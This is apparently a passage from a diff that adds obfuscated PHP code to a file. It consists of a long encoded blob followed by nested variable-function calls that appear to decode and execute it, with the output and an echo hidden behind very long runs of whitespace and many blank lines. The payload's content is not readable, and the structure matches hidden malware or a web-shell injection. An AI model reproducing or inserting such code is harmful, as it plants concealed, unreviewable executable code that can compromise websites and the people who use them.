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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
